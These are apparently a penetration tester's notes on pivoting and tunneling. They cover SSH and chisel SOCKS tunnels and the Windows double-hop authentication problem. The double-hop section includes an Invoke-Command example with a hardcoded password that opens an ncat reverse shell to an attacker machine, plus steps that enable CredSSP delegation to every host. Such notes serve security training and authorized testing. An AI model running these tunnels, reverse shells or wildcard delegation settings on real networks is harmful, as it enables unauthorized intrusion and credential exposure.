# Pivoting/Tunneling  
## SSH   
- Use `sshuttle` : https://github.com/sshuttle/sshuttle  
- Use `ssh` + `proxychains` :  
  `ssh -D 9999 john@10.10.110.50`
  Then `proxychains <command>`   
  (with the config `socks4 127.0.0.1 9999` in the `proxychains4.conf` file)

![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/94-SSH-SOCKS-proxy.png?raw=true) 

      
## Socks    
On the attacker machine (server):      
`./chisel server -p 80 --reverse`   
  
On the pivot/victim machine (client):   
`./chisel client 10.10.14.47:80 R:6666:socks`  
      
Add `socks5 127.0.0.1 6666` in `/etc/proxychains4.conf`     
Then `proxychains <command>`    
       
  
**SOCKS5 proxy through a Sliver beacon**   
TODO   

  
## Port forwarding  
**port forwarding through a Sliver session**   
TODO  
  

             
## Double hop authentication problem fix  
   
**What is the double hop problem ?**  
*(Sources from ATTL4S : https://www.youtube.com/watch?v=p9QFdITuvgU & https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem)*  
  
Services that support Windows authentication carry out something called client impersonation.  
When we access a service :   
1- Credentials are verified  
2- An Access Token with the security context (SID, name, groups, etc.) of your user is created  
3- The service places a copy of that Token into a new thread  
4- That thread can act on your behalf and is subject to the restrictions imposed
by ACLs  
  
The process is detailed in the picture below:  
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/98-PentestAD-token_impersonation.png?raw=true)  
  
The problem is that when authenticating from an interactive authentication, credentials are (usually) stored in lsass.exe for SSO purposes.  
When authenticating from a network authentication, credentials are NOT (usually) stored in lsass.exe, so our credentials will not be cached on the target server.  
  
Interactive authentication vs network authentication:  
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/97-PentestAD-interactive_vs_network_authentication.png?raw=true)  
  
On the last jump, the service does not have the credentials to act as on behalf of the user :  
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/99-PentestAD-double_hop.png?raw=true)   
  
**How to solve the double hop problem ?**  
*(Sources : https://notes.qazeer.io/general/pivoting)*   
This Microsoft document explains how to face the "double hop" problem :   
https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop?view=powershell-7.3&viewFallbackFrom=powershell-7.1  

To solve the "double hop" authentication problem, which occurs whenever trying to access resources on a third server from the first remotely connected server, <ins>use interactive sessions (such as RDP) when it is possible</ins>. If it is not, the `-Credential` argument inside the `Invoke-Command` cmdlet and the CredSSP authentication mechanism can be used. Simply put, the problem happens because credentials are not allowed for delegation and thus can't be passed whenever accessing network resources from the remotely connected system. All access ends up being unauthenticated and results in Access denied errors.  
Using `-Credential` inside `Invoke-Command`:  
```
$user = 'domain.lol\johnfromthegarden'
$pass = 'Habile!123'
$secpasslol = ConvertTo-SecureString $pass -AsPlainText -Force
$creds = New-Object system.management.automation.PSCredential $user,$secpasslol

Invoke-Command -ComputerName 192.168.110.54 -Credential $creds -ScriptBlock {c:\temp\leperche\ncat.exe <the_attacker_machine_listening> 443 -e cmd.exe}
```

If using CredSSP, supports for CredSSP must be activated and configured on the client attacking system. The configuration below allows delegation to any system.
Check if CredSSP is enabled:  
```
Invoke-Command -ComputerName SRVMGMT -Credential domain.lol\johnfromthegarden -ScriptBlock {
    Get-WSManCredSSP
}
```
  
Enable CredSSP:  
```
winrm quickconfig
Set-Item WSMan:localhost\client\trustedhosts -value *
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"  
```
```
Start gpedit.msc
-> "Local Computer Policy" -> "Computer Configuration" -> "Administrative Templates" -> "System" -> "Credential Delegation"
-> In the "Settings" pane, "Allow Delegating Fresh Credentials with NTLM-only Server Authentication". -> "Enabled"
-> And in the "Options" area, "Show" -> "Value" = WSMAN/*
-> "Concatenate OS defaults with input above" checked
Once CredSSP is activated and correctly configured, the PowerShell cmdlets Invoke-Command and Enter-PSSession can be used with the -Authentication CredSSP option to make connections using CredSSP.
```  
  
